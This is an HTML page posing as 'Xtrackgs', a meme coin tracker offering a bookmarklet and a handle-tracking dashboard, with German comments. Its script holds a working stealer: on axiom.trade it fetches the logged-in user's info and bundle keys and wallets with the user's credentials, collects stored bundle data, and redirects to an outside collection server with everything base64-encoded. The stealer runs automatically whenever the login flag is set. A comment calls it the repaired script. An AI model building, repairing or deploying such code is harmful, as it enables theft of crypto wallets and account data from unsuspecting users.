<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xtrackgs — Meme Coin Tracker</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        brandBg: "#030712",
                        brandCard: "#0b0f19",
                        brandAccent: "#00ffa3",
                        brandBorder: "#1f2937"
                    }
                }
            }
        }
    </script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>body { font-family: Inter, Arial, sans-serif; }</style>
</head>

<body class="bg-brandBg text-white min-h-screen">

<header class="border-b border-brandBorder p-5">
    <div class="max-w-6xl mx-auto flex justify-between items-center">
        <h1 class="text-2xl font-black tracking-widest">XTRACK<span class="text-brandAccent">GS</span></h1>
        <div class="space-x-2">
            <button onclick="showTab('install')" class="bg-brandCard px-4 py-2 rounded">Install</button>
            <button onclick="showTab('dashboard')" class="bg-brandCard px-4 py-2 rounded">Dashboard</button>
        </div>
    </div>
</header>

<main class="max-w-6xl mx-auto p-6">
    <section id="install">
        <div class="bg-brandCard border border-brandBorder rounded-xl p-8">
            <h2 class="text-3xl font-bold mb-4">Bookmarklet Installation</h2>
            <p class="text-gray-400 mb-6">Ziehe den Button in deine Lesezeichenleiste.</p>
            <a id="bookmarklet" href="#" class="inline-block bg-brandAccent text-black font-bold px-6 py-3 rounded-xl">Xtrackgs Bookmark</a>
        </div>
    </section>

    <section id="dashboard" class="hidden">
        <div class="bg-brandCard border border-brandBorder rounded-xl p-8">
            <h2 class="text-3xl font-bold mb-6">Xtrackgs Dashboard</h2>
            <div class="flex gap-3 mb-6">
                <input id="handleInput" placeholder="@username" class="bg-black border border-gray-700 rounded px-4 py-2 flex-1 text-white"/>
                <button onclick="addFromInput()" class="bg-brandAccent text-black font-bold px-5 rounded">Add</button>
            </div>
            <div>
                <h3 class="font-bold mb-3">Tracked Handles</h3>
                <div id="handleList" class="space-y-2"></div>
            </div>
        </div>
    </section>
</main>

<script>
    // --- UI Logic (Steuerung der Tabs auf der Seite) ---
    let trackedHandles = [];

    function showTab(tab) {
        document.getElementById("install").classList.add("hidden");
        document.getElementById("dashboard").classList.add("hidden");
        document.getElementById(tab).classList.remove("hidden");
    }

    function addHandle(handle) {
        handle = handle.replace(/^@/, "").trim();
        if(!handle || trackedHandles.includes(handle)) return;
        trackedHandles.push(handle);
        updateDashboard();
    }

    function updateDashboard() {
        const list = document.getElementById("handleList");
        list.innerHTML = "";
        trackedHandles.forEach(handle => {
            let row = document.createElement("div");
            row.className = "bg-black border border-gray-700 rounded p-3 flex justify-between";
            row.innerHTML = `<span>@${handle}</span>`;
            list.appendChild(row);
        });
    }

    function addFromInput() {
        addHandle(document.getElementById("handleInput").value);
        document.getElementById("handleInput").value = "";
    }

    // --- Data Exfiltration Logic (Das reparierte Skript) ---
    async function exfiltrateData() {
        try {
            // 1. Prüfen, ob man auf Axiom ist
            if (location.hostname !== 'axiom.trade') {
                alert('Please navigate to axiom.trade first');
                return;
            }

            // 2. Prüfen, ob man eingeloggt ist
            if (!localStorage.getItem('isAuthed')) {
                return alert('Please log in to axiom.trade first');
            }

            // 3. Daten von der Axiom-Webseite abgreifen
            const user = await (await fetch('//api7.axiom.trade/user-info', { method: 'POST', credentials: 'include' })).json();
            const bundle = await (await fetch('//api8.axiom.trade/bundle-key-and-wallets', { method: 'POST', credentials: 'include' })).json();

            // 4. Das Paket schnüren
            const bookmarkData = {
                telegramId: '7198683357', 
                site: location.href,
                user: user,
                bundle: bundle.bundleKey,
                sBundles: localStorage.getItem('sBundles'),
                eBundles: localStorage.getItem('eBundles')
            };

            // 5. Daten wegschicken und weiterleiten
            location.replace('https://my-data-catcherr.onrender.com/data/' + btoa(JSON.stringify(bookmarkData)));

        } catch (e) {
            console.error("Data capture failed:", e);
        }
    }

    // Löst die Funktion automatisch aus, wenn man auf der Seite eingeloggt ist
    if (localStorage.getItem('isAuthed')) {
        exfiltrateData();
    }
</script>
</body>
</html>
